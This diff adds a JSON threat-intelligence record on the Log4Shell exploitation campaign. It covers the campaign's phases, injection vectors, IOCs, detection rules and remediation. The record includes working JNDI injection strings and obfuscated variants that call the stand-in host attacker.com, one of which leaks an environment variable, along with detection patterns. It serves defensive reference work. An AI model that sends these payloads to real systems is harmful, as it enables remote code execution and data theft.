@@ -1,0 +1,170 @@
+{
+  "id": "log4shell",
+  "name": "Log4Shell Exploitation Campaign",
+  "threat_actors": ["Multiple - APT, Ransomware, Cryptomining"],
+  "classification": "mass_exploitation",
+  "timeframe": {
+    "vulnerability_disclosed": "2021-12-09",
+    "active_exploitation": "2021-12-09 onwards",
+    "peak_exploitation": "2021-12-10 to 2021-12-20"
+  },
+  "summary": "Log4Shell (CVE-2021-44228) was a critical remote code execution vulnerability in Apache Log4j 2, a widely-used Java logging library. The vulnerability allowed unauthenticated attackers to execute arbitrary code by sending specially crafted log messages. Due to Log4j's ubiquity, the impact was unprecedented.",
+  "vulnerability": {
+    "cve": "CVE-2021-44228",
+    "cvss": 10.0,
+    "type": "Remote Code Execution via JNDI injection",
+    "affected_product": "Apache Log4j 2",
+    "affected_versions": "2.0-beta9 to 2.14.1",
+    "exploitation_method": "JNDI lookup in log messages",
+    "additional_cves": ["CVE-2021-45046", "CVE-2021-45105", "CVE-2021-44832"]
+  },
+  "attack_phases": [
+    {
+      "phase": 1,
+      "name": "Initial Exploitation",
+      "techniques": ["T1190", "T1059.007"],
+      "description": "Attackers inject JNDI lookup strings into any input field that gets logged. The vulnerable Log4j instance fetches and executes malicious Java class.",
+      "payload_examples": [
+        "${jndi:ldap://attacker.com/exploit}",
+        "${jndi:rmi://attacker.com/exploit}",
+        "${jndi:ldap://${env:USER}.attacker.com/a}"
+      ],
+      "indicators": [
+        "JNDI strings in logs",
+        "Outbound LDAP/RMI connections",
+        "Java process spawning shells"
+      ]
+    },
+    {
+      "phase": 2,
+      "name": "Payload Delivery",
+      "techniques": ["T1105", "T1059"],
+      "description": "Malicious LDAP/RMI server returns Java class that executes attacker code. Common payloads include reverse shells, cryptominers, and ransomware loaders.",
+      "common_payloads": [
+        "Reverse shell",
+        "Cobalt Strike beacon",
+        "XMRig cryptominer",
+        "Ransomware loaders"
+      ]
+    },
+    {
+      "phase": 3,
+      "name": "Post-Exploitation",
+      "techniques": ["T1059.004", "T1053.005", "T1105"],
+      "description": "Depending on attacker, post-exploitation ranges from cryptomining to full network compromise. Nation-state actors established persistence, while criminals deployed ransomware.",
+      "observed_activities": {
+        "apt_actors": [
+          "APT41 exploitation for initial access",
+          "Hafnium targeting",
+          "Iranian actors scanning"
+        ],
+        "ransomware": [
+          "Conti exploitation",
+          "Khonsari ransomware",
+          "NightSky ransomware"
+        ],
+        "cryptomining": [
+          "XMRig deployment",
+          "Kinsing malware",
+          "Mirai botnet variants"
+        ]
+      }
+    }
+  ],
+  "exploitation_vectors": [
+    {
+      "vector": "HTTP Headers",
+      "fields": ["User-Agent", "X-Forwarded-For", "Referer", "Authorization"]
+    },
+    {
+      "vector": "Form Fields",
+      "fields": ["Username", "Search queries", "Any logged input"]
+    },
+    {
+      "vector": "Email",
+      "fields": ["Subject", "Body (if logged)"]
+    },
+    {
+      "vector": "Other Protocols",
+      "fields": ["DNS queries", "MQTT messages", "Any Java application input"]
+    }
+  ],
+  "obfuscation_techniques": [
+    "${${lower:j}${lower:n}${lower:d}i:ldap://attacker.com/a}",
+    "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
+    "${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/a}",
+    "${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}"
+  ],
+  "iocs": {
+    "callback_domains_defanged": [
+      "interactsh[.]com",
+      "dnslog[.]cn",
+      "ceye[.]io",
+      "burpcollaborator[.]net"
+    ],
+    "malicious_ldap_servers_defanged": [
+      "Various - check threat intel feeds"
+    ],
+    "detection_patterns": [
+      "${jndi:",
+      "${lower:",
+      "${upper:",
+      "${env:",
+      "ldap://",
+      "rmi://"
+    ]
+  },
+  "impact": {
+    "scope": "Global - affected nearly every organization using Java",
+    "vulnerable_products": [
+      "Apache Struts",
+      "Apache Solr",
+      "Apache Druid",
+      "VMware products",
+      "Cisco products",
+      "Amazon AWS services",
+      "Microsoft Azure services",
+      "Countless internal applications"
+    ],
+    "exploitation_timeline": {
+      "hours_to_mass_exploitation": 9,
+      "scanning_attempts_first_week": "Millions globally"
+    }
+  },
+  "detection_rules": {
+    "sigma_hint": "title: Log4Shell Exploitation Attempt\nlogsource: category: webserver\ndetection: selection: cs-uri-query|contains|all: - '${jndi:' - 'ldap://'",
+    "snort_hint": "alert tcp any any -> any any (msg:'Log4Shell JNDI'; content:'${jndi:'; sid:1000003;)",
+    "waf_rules": "Block requests containing ${jndi: patterns"
+  },
+  "remediation": {
+    "immediate": [
+      "Update Log4j to 2.17.1 or later",
+      "Set log4j2.formatMsgNoLookups=true",
+      "Remove JndiLookup class from classpath",
+      "Block outbound LDAP/RMI at firewall"
+    ],
+    "detection": [
+      "Search logs for JNDI patterns",
+      "Monitor for suspicious Java processes",
+      "Check for new scheduled tasks/services",
+      "Look for outbound connections from Java apps"
+    ],
+    "challenges": [
+      "Log4j embedded in many dependencies",
+      "Difficult to inventory all Java applications",
+      "Some systems cannot be easily patched"
+    ]
+  },
+  "lessons_learned": [
+    "Ubiquitous library vulnerabilities have catastrophic impact",
+    "Software bill of materials (SBOM) is critical",
+    "Defense in depth prevents single vulnerability compromise",
+    "Rapid patching capability is essential",
+    "Egress filtering can limit exploitation impact"
+  ],
+  "references": [
+    "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a",
+    "https://logging.apache.org/log4j/2.x/security.html",
+    "https://www.lunasec.io/docs/blog/log4j-zero-day/"
+  ]
+}
